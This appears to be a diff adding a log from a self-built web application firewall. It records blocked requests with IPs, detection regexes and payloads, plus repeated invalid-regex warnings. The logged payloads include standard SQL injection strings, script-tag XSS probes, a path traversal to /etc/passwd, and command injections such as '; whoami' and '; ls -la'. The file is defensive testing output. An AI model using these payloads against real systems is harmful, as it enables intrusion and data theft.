@@ -1,0 +1,442 @@
+[2025-04-19 13:33:28] INFO | CSRF BLOCK | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-19 13:33:37] INFO | RCE BLOCK | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-19 13:42:26] INFO | CSRF BLOCK | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-19 13:42:31] INFO | CSRF BLOCK | ip=88.188.5.25     🇫🇷 France, Paris               | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-19 13:42:44] INFO | CSRF BLOCK | ip=88.188.5.25     🇫🇷 France, Paris               | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-19 13:42:46] INFO | CSRF BLOCK | ip=88.188.5.25     🇫🇷 France, Paris               | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-19 13:42:47] WARNING | Blocked request from banned IP: 88.188.5.25
+[2025-04-20 10:29:59] INFO | CSRF BLOCK | ip=88.188.5.25     Geo lookup failed              | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-20 10:30:26] INFO | CSRF BLOCK | ip=88.198.1.12     Geo lookup failed              | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-20 10:30:47] INFO | CSRF BLOCK | ip=93.184.216.34   Geo lookup failed              | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-20 10:30:47] INFO | CSRF BLOCK | ip=93.184.216.34   Geo lookup failed              | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-20 10:30:47] INFO | CSRF BLOCK | ip=93.184.216.34   Geo lookup failed              | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-20 10:30:47] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:47] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:47] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:48] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:48] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:48] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:48] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:48] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:48] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:48] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:48] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:49] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:49] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:49] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:49] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:49] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:49] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:49] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:49] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:50] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:50] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:50] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:50] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:50] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:50] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:50] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:50] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:51] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:51] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:51] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:51] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:30:51] WARNING | Blocked request from banned IP: 93.184.216.34
+[2025-04-20 10:31:13] INFO | CSRF BLOCK | ip=88.198.5.25     Geo lookup failed              | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-20 10:57:06] INFO | CSRF BLOCK | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-22 14:25:30] INFO | CSRF BLOCK | ip=127.0.0.1       Localhost                      | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-22 14:26:35] INFO | CSRF BLOCK | ip=127.0.0.1       Localhost                      | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-22 14:27:19] INFO | CSRF BLOCK | ip=127.0.0.1       Localhost                      | pattern=Missing CSRF Header | payload=Missing CSRF token on POST request
+[2025-04-22 14:27:37] WARNING | Blocked request from banned IP: 127.0.0.1
+[2025-04-22 14:28:50] INFO | RCE BLOCK | ip=158.35.25.102   🇺🇸 United States, Spring       | pattern=;[\s]* | payload=uGwW7o8Fkxk;
+[2025-04-22 14:29:17] INFO | RCE BLOCK | ip=158.35.25.102   🇺🇸 United States, Spring       | pattern=;[\s]* | payload=q㞜8ݽ;
+[2025-04-22 14:29:19] INFO | RCE BLOCK | ip=158.35.25.102   🇺🇸 United States, Spring       | pattern=\|[\s]* | payload=iכ|kM_q|\m{
+[2025-04-22 14:29:22] WARNING | Blocked request from banned IP: 158.35.25.102
+[2025-04-22 23:39:49] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=http[s]?://127\.0\.0\.1(:\d+)?(/.*|$) | payload=http://127.0.0.1:5000
+[2025-04-22 23:41:38] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=http[s]?://127\.0\.0\.1(:\d+)?(/.*|$) | payload=http://127.0.0.1:5000
+[2025-04-22 23:41:50] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=http[s]?://127\.0\.0\.1(:\d+)?(/.*|$) | payload=http://127.0.0.1:5000
+[2025-04-22 23:49:43] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=http[s]?://127\.0\.0\.1(:\d+)?(/.*|$) | payload=http://127.0.0.1:5000/
+[2025-04-23 00:05:24] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=http[s]?://127\.0\.0\.1(:\d+)?(/.*|$) | payload=http://127.0.0.1:5000/
+[2025-04-23 00:13:33] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=http[s]?://127\.0\.0\.1(:\d+)?(/.*|$) | payload=http://127.0.0.1:5000/
+[2025-04-23 00:13:52] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=http[s]?://127\.0\.0\.1(:\d+)?(/.*|$) | payload=http://127.0.0.1:5000/
+[2025-04-23 00:23:31] INFO | SSRF BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=http[s]?://127\.0\.0\.1(:\d+)?(/.*|$) | payload=http://127.0.0.1:5000/
+[2025-04-23 00:23:45] WARNING | Blocked request from banned IP: 127.0.0.1
+[2025-04-23 00:28:49] INFO | SQLi BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload='or1=1
+[2025-04-23 00:29:08] INFO | SSRF BLOCK | severity=High | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:29:24] INFO | SSRF BLOCK | severity=High | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:29:46] INFO | SSRF BLOCK | severity=High | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:30:10] WARNING | Blocked request from banned IP: 203.0.113.77
+[2025-04-23 00:30:21] INFO | SSRF BLOCK | severity=High | ip=203.0.13.77     🇦🇺 Australia, Adelaide         | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:31:12] INFO | XSS BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=<script\b[^>]*>(.*?)</script> | payload=<script>alert('xss')</script>
+
+[2025-04-23 00:31:22] INFO | XSS BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=<script\b[^>]*>(.*?)</script> | payload= <script>alert('xss')</script>
+[2025-04-23 00:31:29] WARNING | Blocked request from banned IP: 127.0.0.1
+[2025-04-23 00:31:57] INFO | SSRF BLOCK | severity=High | ip=203.0.13.77     🇦🇺 Australia, Adelaide         | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:47:19] INFO | SQLi BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload='or1=1
+[2025-04-23 00:47:38] INFO | SSRF BLOCK | severity=High | ip=203.01.13.77    Unknown                        | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:52:55] INFO | SSRF BLOCK | severity=High | ip=203.01.13.77    Unknown                        | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:55:14] INFO | SSRF BLOCK | severity=High | ip=203.01.13.77    Unknown                        | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:56:13] INFO | SSRF BLOCK | severity=High | ip=203.01.13.77    Unknown                        | pattern=(?:[a-z0-9-]+\.)?(?:internal|intranet|svc|local)(?:\.[a-z]{2,})* | payload=localhost:5000
+[2025-04-23 00:58:36] INFO | SQLi BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload='or1=1
+
+[2025-04-23 00:59:14] INFO | RCE BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=;[\s]* | payload="Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
+[2025-04-23 01:00:18] INFO | SQLi BLOCK | severity=High | ip=127.0.0.1       Localhost                      | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload='or1=1
+[2025-04-23 01:01:22] INFO | SQLi BLOCK | severity=High | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload=' OR 1=1 --
+[2025-04-23 01:01:36] WARNING | Blocked request from banned IP: 127.0.0.1
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.0     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.1     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.2     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.3     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.4     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.5     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.6     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.7     Localhost                      | pattern=;[\s]* | payload=ݵ;
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.8     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.9     Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.10    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.11    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.12    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.13    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.14    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.15    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.16    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.17    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.18    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.19    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.20    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.21    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.22    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.23    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:27] INFO | RCE BLOCK | severity=High | ip=192.168.0.24    Localhost                      | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 01:02:51] WARNING | Blocked request from banned IP: 127.0.0.1
+[2025-04-23 01:08:02] INFO | SQLi BLOCK | severity=High | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload=' OR 1=1 --
+[2025-04-23 01:08:10] INFO | XSS BLOCK | severity=Medium | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=<script\b[^>]*>(.*?)</script> | payload=<script>alert(1)</script>
+[2025-04-23 01:08:16] INFO | LFI BLOCK | severity=Medium | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=\.\./ | payload=../../../../etc/passwd
+[2025-04-23 01:08:23] WARNING | Blocked request from banned IP: 203.0.113.77
+[2025-04-23 01:08:47] INFO | RCE BLOCK | severity=High | ip=203.0.113.70    🇺🇸 United States, New York     | pattern=;[\s]* | payload=; whoami
+[2025-04-23 01:10:00] WARNING | 🚨 Brute force / rate-limit triggered for IP: 203.0.13.77
+[2025-04-23 01:10:00] WARNING | Blocked request from banned IP: 203.0.13.77
+[2025-04-23 01:10:00] WARNING | Blocked request from banned IP: 203.0.13.77
+[2025-04-23 01:10:00] WARNING | Blocked request from banned IP: 203.0.13.77
+[2025-04-23 01:10:00] WARNING | Blocked request from banned IP: 203.0.13.77
+[2025-04-23 01:28:49] INFO | RCE BLOCK | severity=High | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=;[\s]* | payload=; ls -la
+[2025-04-23 01:29:01] INFO | SQLi BLOCK | severity=High | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=('|")\s*or\s*('|")1('|")\s*=\s*('|")1 | payload=' OR '1'='1
+[2025-04-23 01:35:45] INFO | SQLi BLOCK | severity=High | ip=203.01.13.77    Unknown                        | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload=' OR 1=1 --
+[2025-04-23 07:19:37] INFO | SQLi BLOCK | severity=High | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=('|")\s*or\s*('|")1('|")\s*=\s*('|")1 | payload=' OR '1'='1
+[2025-04-23 07:22:19] INFO | SQLi BLOCK | severity=High | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=('|")\s*or\s*('|")1('|")\s*=\s*('|")1 | payload=' OR '1'='1
+[2025-04-23 07:22:37] INFO | RCE BLOCK | severity=High | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=;[\s]* | payload=; ls -la
+[2025-04-23 07:24:10] INFO | SQLi BLOCK | severity=High | ip=203.01.13.77    Unknown                        | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload=' OR 1=1 --
+[2025-04-23 07:24:46] INFO | LFI BLOCK | severity=Medium | ip=127.0.0.1       Localhost                      | pattern=\.\./ | payload=../../../../etc/passwd
+[2025-04-23 07:39:18] INFO | RCE BLOCK | severity=High | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 07:39:26] INFO | RCE BLOCK | severity=High | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 07:41:55] INFO | RCE BLOCK | severity=High | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 07:43:04] WARNING | Blocked request from banned IP: 203.0.113.77
+[2025-04-23 07:43:14] INFO | RCE BLOCK | severity=High | ip=203.01.113.77   Unknown                        | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 07:49:01] INFO | RCE BLOCK | severity=High | ip=203.01.113.77   Unknown                        | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 07:50:22] INFO | RCE BLOCK | severity=High | ip=203.011.113.77  Unknown                        | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 07:50:32] INFO | RCE BLOCK | severity=High | ip=203.011.113.77  Unknown                        | pattern=;[\s]* | payload=Mozilla/5.0 (Windows NT; Windows NT 10.0; fr-FR) WindowsPowerShell/5.1.26100.3624
+[2025-04-23 08:03:34] INFO | XSS BLOCK | severity=Medium | ip=203.0.113.77    🇺🇸 United States, New York     | pattern=<script\b[^>]*>(.*?)</script> | payload=<script>alert('XSS in body')</script>
+[2025-04-23 08:09:28] INFO | LFI BLOCK | severity=Medium | ip=203.0.113.7     🇺🇸 United States, New York     | pattern=\.\./ | payload=../../../../etc/passwd
+[2025-04-23 08:09:40] INFO | LFI BLOCK | severity=Medium | ip=203.0.113.8     🇺🇸 United States, New York     | pattern=\.\./ | payload=../../../../etc/passwd
+[2025-04-23 08:12:30] INFO | SQLi BLOCK | severity=High | ip=203.0.113.11    🇺🇸 United States, New York     | pattern=('|\")\s*or\s*\1?\s*\d+\s*=\s*\d+ | payload='or1=1
+[2025-04-23 08:40:35] INFO | SQLi BLOCK | severity=High | ip=88.198.5.25     🇩🇪 Germany, Falkenstein        | pattern=('|")\s*or\s*('|")1('|")\s*=\s*('|")1 | payload=' OR '1'='1
+[2025-04-23 08:41:36] INFO | SQLi BLOCK | severity=High | ip=89.198.5.25     🇮🇷 Iran, Tehran                | pattern=('|")\s*or\s*('|")1('|")\s*=\s*('|")1 | payload=' OR '1'='1
+[2025-04-23 08:43:04] INFO | XSS BLOCK | severity=Medium | ip=203.0.113.21    🇺🇸 United States, New York     | pattern=<script\b[^>]*>(.*?)</script> | payload=<script>alert('XSS in body')</script>
+[2025-04-26 15:09:45] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:09:45] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:09:45] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:18:16] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:18:16] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:18:16] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:18:51] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:18:51] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:18:51] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:19:20] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:19:20] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:19:20] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:20:01] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:20:01] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:20:01] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:20:01] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:20:01] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:20:01] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:20:23] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:20:23] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:20:23] WARNING Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:21:33] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:21:33] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:21:33] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:22:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:22:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:22:51] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:22:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-26 15:22:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-26 15:22:52] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-26 15:23:01] INFO | XSS BLOCK | severity=Medium | ip=203.0.113.21    🇺🇸 United States, New York     | pattern=<script\b[^>]*>(.*?)</script> | payload=<script>alert('XSS in body')</script>
+[2025-04-26 15:23:08] INFO | SQLi BLOCK | severity=High | ip=89.198.5.25     🇮🇷 Iran, Tehran                | pattern=('|")\s*or\s*('|")1('|")\s*=\s*('|")1 | payload=' OR '1'='1
+[2025-04-28 07:59:44] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 07:59:44] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
+[2025-04-28 07:59:44] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)assert\\\\s*\\\\(' (missing ), unterminated subpattern at position 23)
+[2025-04-28 07:59:45] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)eval\\\\s*\\\\(' (missing ), unterminated subpattern at position 21)
+[2025-04-28 07:59:45] WARNING | Invalid regex in rce_patterns.txt: '(?i)(\\b|\\W)base64_decode\\\\s*\\\\(' (missing ), unterminated subpattern at position 30)
